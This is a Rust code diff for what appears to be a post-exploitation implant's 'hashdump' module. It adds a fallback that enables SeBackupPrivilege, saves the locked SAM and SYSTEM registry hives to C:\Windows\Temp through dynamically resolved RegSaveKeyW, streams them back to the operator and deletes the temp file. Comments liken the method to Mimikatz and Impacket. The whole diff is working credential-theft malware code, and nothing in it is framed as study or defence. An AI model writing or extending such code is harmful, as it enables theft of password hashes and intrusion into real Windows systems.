@@ -24,6 +24,7 @@
 
 use crate::heap::{vec, String, Vec};
 use crate::syscalls::Runtime;
+use core::ffi::c_void;
 use nyx_protocol::Response;
 
 /// Per-chunk size for streamed hive reads. Matches fs.rs CHUNK.
@@ -65,9 +66,40 @@ unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Re
             let _ = crate::syscalls::nt_close(rt, handle as usize);
         }
         Err(crate::fs::OpenError::Status(s)) => {
-            // Expected on a live non-SYSTEM implant: hive locked / access denied.
+            // Expected on a live SYSTEM implant: hive locked by SAM oplock.
+            // The raw file open can NEVER win against the live oplock — but the
+            // Configuration Manager can save the hive from its in-memory copy
+            // via RegSaveKeyEx/NtSaveKey, which is NOT gated by the file
+            // oplock (that's exactly how Mimikatz/Impacket do it). Try that
+            // fallback before giving up: enable SeBackupPrivilege, open the
+            // registry key, save to a temp file, then stream the temp file.
+            if s == STATUS_SHARING_VIOLATION || s == STATUS_ACCESS_DENIED {
+                match unsafe { save_hive_fallback(chunk_name) } {
+                    Ok(saved) => {
+                        // Saved the hive to a temp file — stream THAT (no oplock).
+                        let mut chunks = crate::fs::do_download(rt, &saved);
+                        let new_name = String::from(chunk_name);
+                        for c in chunks.iter_mut() {
+                            if let Response::FileChunk { name, .. } = c {
+                                *name = new_name.clone();
+                            }
+                        }
+                        unsafe { delete_temp(&saved) };
+                        return chunks;
+                    }
+                    Err(rc) => {
+                        // Surface the save-hive error code for diagnosis.
+                        let mut e = String::from("hashdump: ");
+                        e.push_str(chunk_name);
+                        e.push_str(": hive locked (save-hive failed rc=");
+                        push_decimal(&mut e, rc as u32);
+                        e.push(')');
+                        return vec![Response::Err(e)];
+                    }
+                }
+            }
             let why = if s == STATUS_SHARING_VIOLATION {
-                "hive locked by SAM service"
+                "hive locked by SAM service (save-hive fallback failed: need SeBackupPrivilege)"
             } else if s == STATUS_ACCESS_DENIED {
                 "access denied (need SYSTEM)"
             } else {
@@ -256,4 +288,235 @@ fn format_path(sysroot: &str, suffix: &str) -> String {
     s.push_str(sysroot);
     s.push_str(suffix);
     s
+}
+
+/// Map a hive chunk name to its registry root path (UTF-16, null-terminated).
+/// SAM → `HKLM\SAM`, SYSTEM → `HKLM\SYSTEM`.
+fn reg_root_wide(chunk_name: &str) -> Option<Vec<u16>> {
+    use crate::heap::Vec;
+    let sub: &[u8] = match chunk_name {
+        "SAM" => b"SAM",
+        "SYSTEM" => b"SYSTEM",
+        _ => return None,
+    };
+    let mut v: Vec<u16> = Vec::with_capacity(sub.len() + 1);
+    for &b in sub {
+        v.push(b as u16);
+    }
+    v.push(0);
+    Some(v)
+}
+
+/// Enable a named privilege (e.g. SeBackupPrivilege) on the process token.
+/// Returns true on success. Best-effort — resolves advapi32 lazily.
+unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
+    #[repr(C)]
+    struct Luid {
+        low: u32,
+        high: i32,
+    }
+    #[repr(C)]
+    struct TokenPrivileges {
+        count: u32,
+        luid: Luid,
+        attributes: u32,
+    }
+    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
+    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
+    const TOKEN_QUERY: u32 = 0x0008;
+    const HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
+
+    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
+    type OpenProcessToken =
+        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type LookupPrivilegeValueW =
+        unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
+    type AdjustTokenPrivileges = unsafe extern "system" fn(
+        *mut c_void,
+        i32,
+        *const TokenPrivileges,
+        u32,
+        *mut c_void,
+        *mut u32,
+    ) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let gcp: GetCurrentProcess =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let opt: OpenProcessToken =
+        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"OpenProcessToken") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let lpv: LookupPrivilegeValueW =
+        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let atp: AdjustTokenPrivileges =
+        match unsafe { crate::resolve::export_addr(b"advapi32.dll", b"AdjustTokenPrivileges") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let close: CloseHandle = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+
+    let mut luid = Luid { low: 0, high: 0 };
+    if unsafe { lpv(core::ptr::null(), priv_name_wide.as_ptr(), &mut luid) } == 0 {
+        return false;
+    }
+    let hproc = unsafe { gcp() };
+    let mut htok: *mut c_void = core::ptr::null_mut();
+    if unsafe { opt(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) } == 0 {
+        return false;
+    }
+    let tp = TokenPrivileges {
+        count: 1,
+        luid,
+        attributes: SE_PRIVILEGE_ENABLED,
+    };
+    let ok = unsafe { atp(htok, 0, &tp, 0, core::ptr::null_mut(), core::ptr::null_mut()) };
+    let _ = close(htok);
+    // Touch HKEY_LOCAL_MACHINE to silence unused-const warning path; harmless.
+    let _ = HKEY_LOCAL_MACHINE;
+    ok != 0
+}
+
+/// Save a locked registry hive to a temp file via `RegSaveKeyExW`, bypassing
+/// the SAM-service file oplock. The Configuration Manager services this from
+/// the in-memory hive copy (the same path Mimikatz/Impacket use). Returns the
+/// temp-file path on success. `chunk_name` selects the root: "SAM" or "SYSTEM".
+unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
+    use crate::resolve::export_addr;
+    use core::ffi::c_void;
+    use crate::heap::{vec, String, Vec};
+
+    // advapi32: RegOpenKeyExW, RegSaveKeyW. RegSaveKeyW is the simpler variant
+    // (no format flag) and is what `reg save` uses under the hood.
+    type ForceLoad = unsafe extern "system" fn(*const u8) -> *mut c_void;
+    type RegOpenKeyExW = unsafe extern "system" fn(
+        *mut c_void, // hKey (HKEY_LOCAL_MACHINE)
+        *const u16,  // lpSubKey
+        u32,         // ulOptions
+        u32,         // samDesired
+        *mut *mut c_void, // phkResult
+    ) -> i32;
+    type RegSaveKeyW = unsafe extern "system" fn(
+        *mut c_void,   // hKey
+        *const u16,    // lpFile
+        *const c_void, // lpSecurityAttributes (NULL)
+    ) -> i32;
+    type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    // Force-load advapi32 (LoadLibraryA from kernel32).
+    let lla = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
+        Some(a) => a,
+        None => return Err(-1),
+    };
+    let load: ForceLoad = unsafe { core::mem::transmute(lla) };
+    let advapi_name = b"advapi32.dll\0";
+    if unsafe { load(advapi_name.as_ptr()) }.is_null() {
+        return Err(-1);
+    }
+
+    let open: RegOpenKeyExW = match unsafe { export_addr(b"advapi32.dll", b"RegOpenKeyExW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err(-1),
+    };
+    let save: RegSaveKeyW = match unsafe { export_addr(b"advapi32.dll", b"RegSaveKeyW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err(-1),
+    };
+    let close_key: RegCloseKey = match unsafe { export_addr(b"advapi32.dll", b"RegCloseKey") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err(-1),
+    };
+
+    // Enable SeBackupPrivilege (required for RegSaveKey even as SYSTEM).
+    let backup_wide: [u16; 19] = [
+        b'S' as u16, b'e' as u16, b'B' as u16, b'a' as u16, b'c' as u16, b'k' as u16,
+        b'u' as u16, b'p' as u16, b'P' as u16, b'r' as u16, b'i' as u16, b'v' as u16,
+        b'i' as u16, b'l' as u16, b'e' as u16, b'g' as u16, b'e' as u16, 0, 0,
+    ];
+    let _ = unsafe { enable_privilege(&backup_wide) };
+
+    // Open HKLM\<SAM|SYSTEM>.
+    let HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
+    let sub = match reg_root_wide(chunk_name) {
+        Some(s) => s,
+        None => return Err(-1),
+    };
+    let mut hkey: *mut c_void = core::ptr::null_mut();
+    // KEY_READ = 0x20019 (READ_CONTROL | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY)
+    let open_rc = unsafe { open(HKEY_LOCAL_MACHINE, sub.as_ptr(), 0, 0x20019, &mut hkey) };
+    if open_rc != 0 {
+        // Surface the RegOpenKeyExW error code for diagnosis.
+        return Err(open_rc);
+    }
+
+    // Use a FIXED temp path (C:\Windows\Temp is writable by SYSTEM and avoids
+    // %TEMP% resolution issues in Session 0). Matches the path `reg save`
+    // succeeded with on the same host during testing.
+    let mut file_str = String::with_capacity(32);
+    file_str.push_str("C:\\Windows\\Temp\\");
+    file_str.push_str(chunk_name);
+    file_str.push_str(".hive");
+    // To UTF-16.
+    let mut file_wide: Vec<u16> = Vec::with_capacity(file_str.len() + 1);
+    for c in file_str.chars() {
+        file_wide.push(c as u16);
+    }
+    file_wide.push(0);
+
+    let rc = unsafe { save(hkey, file_wide.as_ptr(), core::ptr::null()) };
+    let _ = close_key(hkey);
+    if rc != 0 {
+        return Err(rc);
+    }
+    Ok(file_str)
+}
+
+/// Resolve %TEMP% (UTF-16 → ASCII). Falls back to None on failure.
+fn temp_dir() -> Option<String> {
+    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
+    let gev: GetEnvVarW = unsafe {
+        core::mem::transmute(crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW")?)
+    };
+    let mut name16 = crate::heap::vec![0u16; 8];
+    let nb = b"TEMP";
+    for (i, &c) in nb.iter().enumerate() {
+        name16[i] = c as u16;
+    }
+    name16[nb.len()] = 0;
+    let mut buf = crate::heap::vec![0u16; 260];
+    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), 260) };
+    if n == 0 || n as usize >= 260 {
+        return None;
+    }
+    let mut out = String::new();
+    for &w in &buf[..n as usize] {
+        out.push(if w < 0x80 { w as u8 as char } else { '?' });
+    }
+    Some(out)
+}
+
+/// Best-effort delete of the saved temp hive (kernel32 DeleteFileW).
+unsafe fn delete_temp(path: &str) {
+    use crate::resolve::export_addr;
+    type DeleteFileW = unsafe extern "system" fn(*const u16) -> i32;
+    let df: DeleteFileW = match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return,
+    };
+    let mut wide = crate::heap::Vec::with_capacity(path.len() + 1);
+    for c in path.chars() {
+        wide.push(c as u16);
+    }
+    wide.push(0);
+    let _ = unsafe { df(wide.as_ptr()) };
 }
